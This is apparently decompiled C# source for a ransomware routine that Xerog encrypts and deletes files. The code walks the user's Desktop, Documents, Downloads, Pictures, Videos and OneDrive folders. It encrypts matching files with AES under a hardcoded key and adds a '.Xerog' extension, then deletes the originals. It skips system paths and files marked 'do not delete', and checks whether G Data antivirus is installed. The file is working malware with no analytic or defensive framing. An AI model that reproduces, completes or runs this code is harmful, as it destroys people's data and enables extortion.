using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;

internal static class Apana
{
	private static readonly HashSet<string> EncryptedFiles = new HashSet<string>();

	private const string EncryptionFileExtension = ".Xerog";

	private const string EncryptionPassword = "OMGOMGOMGLV2PATCHER111==";

	private static HashSet<string> DirectoriesToEncrypt = new HashSet<string>
	{
		Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "Desktop"),
		Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "Downloads"),
		Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "Documents"),
		Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "Videos"),
		Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "Pictures"),
		Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "OneDrive")
	};

	internal static void EncryptFileSystem()
	{
		HashSet<string> extensionsToEncrypt = new HashSet<string>(GetExtensionsToEncrypt());
		foreach (string item in DirectoriesToEncrypt)
		{
			EncryptFiles(item, ".Xerog", extensionsToEncrypt);
		}
		foreach (string encryptedFile in EncryptedFiles)
		{
			try
			{
				File.Delete(encryptedFile);
			}
			catch
			{
			}
		}
	}

	private static IEnumerable<string> GetExtensionsToEncrypt()
	{
		HashSet<string> hashSet = new HashSet<string>();
		foreach (string item in Resources.ExtensionsToEncrypt.Split(new string[2]
		{
			Environment.NewLine,
			" "
		}, StringSplitOptions.RemoveEmptyEntries).ToList())
		{
			hashSet.Add(item.Trim());
		}
		hashSet.Remove(".Xerog");
		return hashSet;
	}

	private static void EncryptFiles(string dirPath, string encryptionExtension, HashSet<string> extensionsToEncrypt)
	{
		foreach (string item in from file in Directory.GetFiles(dirPath)
			from ext in extensionsToEncrypt
			where file.EndsWith(ext)
			select file into file
			select new
			{
				file = file,
				fi = new FileInfo(file)
			} into t
			where t.fi.Length < 10000000L
			select t.file)
		{
			try
			{
				FileInfo fileInfo;
				if (!item.StartsWith("C:\\Windows", StringComparison.InvariantCultureIgnoreCase) && !item.StartsWith("C:\\Program", StringComparison.InvariantCultureIgnoreCase) && !item.ToLower().Contains("appdata"))
				{
					fileInfo = new FileInfo(item);
					DirectoryInfo directoryInfo = new DirectoryInfo("C:\\").GetDirectories().FirstOrDefault((DirectoryInfo x) => x.Name.StartsWith("X"));
					if (object.Equals(directoryInfo, null))
					{
						goto IL_01db;
					}
					DirectoryInfo directory = new FileInfo(item).Directory;
					if (!directory.Name.Equals("") && !directory.Name.EndsWith(directoryInfo.Name.Substring(1)))
					{
						goto IL_01db;
					}
				}
				goto end_IL_011d;
				IL_01db:
				if (!fileInfo.Name.StartsWith("ZZZZZ") && !fileInfo.Name.StartsWith("!!!!!") && !fileInfo.Name.ToLower().Contains("don't erase") && !fileInfo.Name.ToLower().Contains("don't remove") && !fileInfo.Name.ToLower().Contains("don't discard") && !fileInfo.Name.ToLower().Contains("don't delete") && !fileInfo.Name.ToLower().Contains("do not erase") && !fileInfo.Name.ToLower().Contains("do not remove") && !fileInfo.Name.ToLower().Contains("do not discard") && !fileInfo.Name.ToLower().Contains("do not delete") && !fileInfo.Name.ToLower().Contains("do notdelete") && !fileInfo.Name.ToLower().Contains("do notdiscard") && !fileInfo.Name.ToLower().Contains("do notremove") && !fileInfo.Name.ToLower().Contains("do noterase") && !fileInfo.Name.ToLower().Contains("do not-delete") && !fileInfo.Name.ToLower().Contains("do not-discard") && !fileInfo.Name.ToLower().Contains("do not-remove") && !fileInfo.Name.ToLower().Contains("do not-erase") && !fileInfo.Name.ToLower().Contains("do not_delete") && !fileInfo.Name.ToLower().Contains("do not_discard") && !fileInfo.Name.ToLower().Contains("do not_remove") && !fileInfo.Name.ToLower().Contains("do not_erase") && !fileInfo.Name.ToLower().Contains("don'tdelete") && !fileInfo.Name.ToLower().Contains("don'tdiscard") && !fileInfo.Name.ToLower().Contains("don'tremove") && !fileInfo.Name.ToLower().Contains("don'terase") && !fileInfo.Name.ToLower().Contains("don't-delete") && !fileInfo.Name.ToLower().Contains("don't-discard") && !fileInfo.Name.ToLower().Contains("don't-remove") && !fileInfo.Name.ToLower().Contains("don't-erase") && !fileInfo.Name.ToLower().Contains("don't_delete") && !fileInfo.Name.ToLower().Contains("don't_discard") && !fileInfo.Name.ToLower().Contains("don't_remove") && !fileInfo.Name.ToLower().Contains("don't_erase") && !fileInfo.Name.StartsWith("$"))
				{
					string text = item;
					if (!Directory.Exists("C:\\Program Files\\G Data") && !Directory.Exists("C:\\Program Files (x86)\\G Data"))
					{
						text = text ?? "";
						File.Move(item, text);
					}
					if (EncryptFile(text, encryptionExtension))
					{
						EncryptedFiles.Add(text);
					}
				}
				end_IL_011d:;
			}
			catch
			{
			}
		}
	}

	private static bool EncryptFile(string path, string encryptionExtension)
	{
		try
		{
			if (path.StartsWith("C:\\Windows", StringComparison.InvariantCultureIgnoreCase) || path.StartsWith("C:\\Program", StringComparison.InvariantCultureIgnoreCase) || path.ToLower().Contains("appdata"))
			{
				return false;
			}
			using AesCryptoServiceProvider aesCryptoServiceProvider = new AesCryptoServiceProvider();
			aesCryptoServiceProvider.Key = Convert.FromBase64String("OMGOMGOMGLV2PATCHER111==");
			aesCryptoServiceProvider.IV = new byte[16]
			{
				0, 1, 0, 3, 5, 3, 0, 1, 0, 0,
				2, 0, 6, 7, 6, 0
			};
			EncryptFile(aesCryptoServiceProvider, path, path + encryptionExtension);
		}
		catch
		{
			return false;
		}
		return true;
	}

	private static void EncryptFile(SymmetricAlgorithm alg, string inputFile, string outputFile)
	{
		byte[] array = new byte[65536];
		using FileStream fileStream = new FileStream(inputFile, FileMode.Open);
		using FileStream stream = new FileStream(outputFile, FileMode.Create);
		using CryptoStream cryptoStream = new CryptoStream(stream, alg.CreateEncryptor(), CryptoStreamMode.Write);
		int num;
		do
		{
			num = fileStream.Read(array, 0, array.Length);
			if (num != 0)
			{
				cryptoStream.Write(array, 0, num);
			}
		}
		while (num != 0);
	}
}
